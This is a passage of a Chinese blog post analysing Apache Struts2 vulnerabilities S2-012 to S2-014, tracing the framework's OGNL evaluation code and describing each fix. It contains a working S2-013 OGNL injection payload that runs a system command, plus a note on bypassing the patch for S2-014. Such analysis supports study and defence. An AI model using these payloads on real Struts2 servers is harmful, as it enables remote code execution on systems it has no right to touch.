+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">this</span>.username.isEmpty()) || (<span class="built_in">this</span>.password.isEmpty())) &#123;</span><br><span class="line">      	<span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">this</span>.username.equalsIgnoreCase(<span class="string">&quot;admin&quot;</span>)) &amp;&amp; (<span class="built_in">this</span>.password.equals(<span class="string">&quot;admin&quot;</span>))) &#123;</span><br><span class="line">      	<span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//return &quot;error&quot;;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect&quot;</span>; <span class="comment">//for s2-012</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在自定义Action处理完请求之后，struts2会调用一系列的拦截器，将请求转化为响应。</p>
+<p><code>xwork-core-2.3.12-sources.jar!/com/opensymphony/xwork2/DefaultActionInvocation.java</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826174308.png"></p>
+<p>根据action的返回值（success、error、redirect等）来调用相应的类来处理。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826174701.png"></p>
+<p>继续跟进，会对要跳转到的地址进行一次ognl表达式的解析，又看到熟悉的<code>translateVariables</code>了。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826174918.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826175430.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826175522.png"></p>
+<p>由于这里第一次是<code>$</code>开头，恶意表达式是<code>#</code>，都会解析一次，所以payload可以正常解析并执行。</p>
+<h4 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h4><p>struts2默认禁用eval表达式的执行。</p>
+<p><code>xwork-core-2.3.14.1.jar!/com/opensymphony/xwork2/config/impl/DefaultConfiguration.class</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826181915.png"></p>
+<h3 id="s2-013-x2F-s2-014"><a href="#s2-013-x2F-s2-014" class="headerlink" title="s2-013&#x2F;s2-014"></a>s2-013&#x2F;s2-014</h3><p>影响版本: 2.0.0 - 2.3.14.1</p>
+<h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s2-013</span><br><span class="line">a=%25&#123;%23_memberAccess[&quot;allowStaticMethodAccess&quot;]%3dtrue,%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;whoami&#x27;).getInputStream())&#125;</span><br><span class="line"></span><br><span class="line">s2-014</span><br><span class="line">s2-013的补丁只是将%&#123;ognl&#125;过滤，将%换成$即可绕过</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>struts2的标签中 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 都有一个 includeParams 属性，可以设置成如下值</p>
+<ol>
+<li><em>none</em> - URL中<em>不</em>包含任何参数（默认）</li>
+<li><em>get</em> - 仅包含URL中的GET参数</li>
+<li><em>all</em> - 在URL中包含GET和POST参数</li>
+</ol>
+<p>当<code>includeParams=all</code>的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。</p>
+<p>此时<code>&lt;s:a&gt;</code> 或<code>&lt;s:url&gt;</code>尝试去解析原始请求参数时，会导致OGNL表达式的执行</p>
+</blockquote>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">         pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;h2&gt;S2-<span class="number">013</span> Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">&quot;https://struts.apache.org/docs/s2-013.html&quot;</span>&gt;https:<span class="comment">//struts.apache.org/docs/s2-013.html&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;p&gt;Try add some parameters in URL&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;s:a id=<span class="string">&quot;link1&quot;</span> action=<span class="string">&quot;link&quot;</span> includeParams=<span class="string">&quot;all&quot;</span>&gt;<span class="string">&quot;s:a&quot;</span> tag&lt;/s:a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;s:url id=<span class="string">&quot;link2&quot;</span> action=<span class="string">&quot;link&quot;</span> includeParams=<span class="string">&quot;all&quot;</span>&gt;<span class="string">&quot;s:url&quot;</span> tag&lt;/s:url&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>根据s2-001的经验，struts2在解析框架定义的标签时会调用</p>
+<p><code>struts2-core-2.3.14.1-sources.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.java</code>的<code>doStartTag</code>方法。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826210952.png"></p>
+<p>继续跟进到<code>struts2-core-2.3.14.1-sources.jar!/org/apache/struts2/components/ServletUrlRenderer.java</code>，这里会进行url的渲染。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826211205.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826211246.png"></p>
+<p>跟进<code>renderUrl</code>方法，然后继续跟进：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826211741.png"></p>
+<p>在<code>struts2-core-2.3.14.1-sources.jar!/org/apache/struts2/views/util/DefaultUrlHelper.java</code>中</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826211924.png"></p>
+<p>会将所有参数进行遍历，然后对参数值进行解析。</p>
+<p><code>struts2-core-2.3.14.1-sources.jar!/org/apache/struts2/views/util/DefaultUrlHelper.java</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826212040.png"></p>
+<p>跟进<code>translateAndEncode</code>方法，又看到熟悉的<code>translateVariables</code>方法了。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826212135.png"></p>
+<p>注意看此时的context：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826212312.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826212509.png"></p>
+<p>是允许静态方法调用的，但是<code>allowStaticMethodAccess</code>即沙箱是开启的。</p>
+<h4 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h4><p><code>struts2-core-2.3.14.2-sources.jar!/org/apache/struts2/views/util/DefaultUrlHelper.java</code>中将<code>translateAndEncode</code>方法改为了encode方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826213505.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826213625.png"></p>
+<p>只将参数进行url编码后就返回，不再进行ognl表达式的解析。</p>
+<p>与此同时，自2.3.14.2版本开始，struts2的沙箱发生了变化，<code>xwork-core-2.3.14.2.jar!/com/opensymphony/xwork2/ognl/SecurityMemberAccess.class</code>删除了<code>setAllowStaticMethodAccess</code>方法。这就意味只我们无法通过之前&#96;%</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
